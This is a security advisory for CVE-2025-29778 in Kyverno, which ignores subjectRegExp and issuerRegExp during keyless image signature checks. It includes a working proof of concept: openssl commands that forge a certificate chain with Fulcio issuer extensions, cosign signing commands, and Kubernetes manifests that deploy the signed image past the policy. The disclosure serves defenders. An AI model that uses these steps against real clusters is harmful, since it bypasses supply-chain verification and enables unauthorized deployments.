# [M] Kyverno ignores subjectRegExp and IssuerRegExp

## Summary
Severity: Medium
Advisory: GHSA-46mp-8w32-6g94
CVE: CVE-2025-29778
CWE: CWE-285
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2025-03-24
Source: https://github.com/advisories/GHSA-46mp-8w32-6g94
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=1.13.0 <1.14.0-alpha.1

## Details
### Summary
Kyverno ignores subjectRegExp and IssuerRegExp while verifying artifact's sign with keyless mode. It allows the attacker to deploy kubernetes resources with the artifacts that were signed by unexpected certificate.

### Details
Kyverno checks only subject and issuer fields when verifying an artifact's signature: https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537. While there are subjectRegExp and issuerRegExp fields that can also be used for the defining expected subject and issue values. If the last ones are used then their values are not taken in count and there is no actually restriction for the certificate that was used for the image sign.


### PoC

For the successful exploitation attacker needs:
- Private key of any certificate in the certificate chain that trusted by cosign. It can be certificate that signed by company's self-signed Root CA if they are using their own PKI.
- Access to container registry to push artifacts images 
- Availability to deploy malicious artifacts to the kubernetes cluster

1. Generate certificate that will be used for the image signing with the oidcissuer url. That can be done with the Fulcio or manually by using openssl

```
# Create self-signed RootCA
openssl req -x509 -newkey rsa:4096 -keyout root-ca-key.pem -sha256 -noenc -days 9999 -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Root Certificate Authority" -out root-ca.pem


# Create request for the intermediate certificate
openssl req -noenc -newkey rsa:4096 -keyout intermediate-ca-key.pem -addext "subjectKeyIdentifier = hash" -addext "keyUsage = critical,keyCertSign" -addext "basicConstraints = critical,CA:TRUE,pathlen:2" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Intermediate Certificate Authority" -out intermediate-ca.csr

# Issue intermediate cert with RootCA
openssl x509 -req -days 9999 -sha256 -in intermediate-ca.csr -CA root-ca.pem -CAkey root-ca-key.pem -copy_extensions copy -out intermediate-ca.pem

# OID_1_1 is the hexadecimal representation of the oidcissuer url
OID_1_1=$(echo -n "https://me.net" | xxd -p -u)

# Create request for the leaf certificate
openssl req -noenc -newkey rsa:4096 -keyout my-key.pem -addext "subjectKeyIdentifier = hash" -addext "basicConstraints = critical,CA:FALSE" -addext "keyUsage = critical,digitalSignature" -addext "subjectAltName = email:me@me.net" -addext "1.3.6.1.4.1.57264.1.1 = DER:${OID_1_1}" -addext "1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:https://me.net" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=My Cosign Certificate" -out my-cert.csr

# Issue leaf cert with Intermediate CA
openssl x509 -req -in my-cert.csr -CA intermediate-ca.pem -CAkey intermediate-ca-key.pem -copy_extensions copy -days 9999 -sha256 -out my-cert.pem

# Generate certificates chain
cat intermediate-ca.pem root-ca.pem > cert-chain.pem
```

2. Build and push container image
2. Import key and sign the image with the generated certificate
```
COSIGN_PASSWORD="" cosign import-key-pair --key my-key.pem --output-key-prefix=import-my-key
COSIGN_PASSWORD="" cosign sign $IMAGE_WITH_HASH --tlog-upload=false --cert my-cert.pem --cert-chain cert-chain.pem --key import-my-key.key
```

3. Add ClusterPolicy for the Kyverno with the wrong subject and issuer regexp. Adding (Fulcio) Root CA as secret and using it in policy is optional only if cosign cannot trust it:
```
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: check-image-keyless
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
    - name: check-image-keyless
      match:
        any:
        - resources:
            kinds:
              - Pod
      context:
        - name: encodedCert
          apiCall:
            urlPath: "/api/v1/namespaces/kyverno/secrets/fulcio-ca"
            method: GET
            jmesPath: "data.\"fulcio-ca.pem\""
        - name: root
          variable:
            jmesPath: "base64_decode(encodedCert)"
      verifyImages:
      - imageReferences:
        - "<IMAGE_REGEXP>"
        attestors:
        - entries:
          - keyless:
              subjectRegExp: https://ivalid
              issuerRegExp: https://ivalid
              roots: "{{root}}"
              rekor:
                url: <URL_TO_REKOR>
                pubkey: |-
                  -----BEGIN PUBLIC KEY-----
                  ...
                  -----END PUBLIC KEY-----
              ctlog:
                pubkey: |-
                  -----BEGIN PUBLIC KEY-----
                  ...
                  -----END PUBLIC KEY-----
```

4. Deploy previously signed image
```
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: image-sign
  name: image-sign
  namespace: default
spec:
  replicas: 2
  selector:
    matchLabels:
      app: image-sign
  strategy: {}
  template:
    metadata:
      annotations:
      labels:
        app: image-sign
    spec:
      containers:
        - image: <YOUR_IMAGE>
          imagePullPolicy: Always
          name: image-signing
          ports:
            - containerPort: 5000
          resources:
            requests:
              memory: 500Mi
              cpu: 0.1
            limits:
              memory: 2Gi
              cpu: 0.2
      restartPolicy: Always
status: {}
```

5. The deployment with pods will be create successfully due to not checking subjectRegExp and issuerRegExp fields validation

### Impact
Deploying unauthorized kubernetes resources that can lead to full compromise of kubernetes cluster

### P.S.
Problem was discovered by me when testing image sign verifying with keyless signing: 
https://kubernetes.slack.com/archives/CLGR9BJU9/p1740136401365279?thread_ts=1740136401.365279&cid=CLGR9BJU9. Then it was [verified](https://github.com/kyverno/policies/issues/1246) and [fixed](https://github.com/kyverno/kyverno/pull/12237) by [Mohcode](https://github.com/Mohdcode). But i think it should be registered as security problem such as it allows to bypass part of the verification mechanism and Kyverno users should be aware of it.

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-46mp-8w32-6g94
- https://nvd.nist.gov/vuln/detail/CVE-2025-29778
- https://github.com/kyverno/policies/issues/1246
- https://github.com/kyverno/kyverno/pull/12237
- https://github.com/kyverno/kyverno/commit/8777672fb17bdf252bd2e7d8de3441e240404a60
- https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537
- https://github.com/kyverno/kyverno
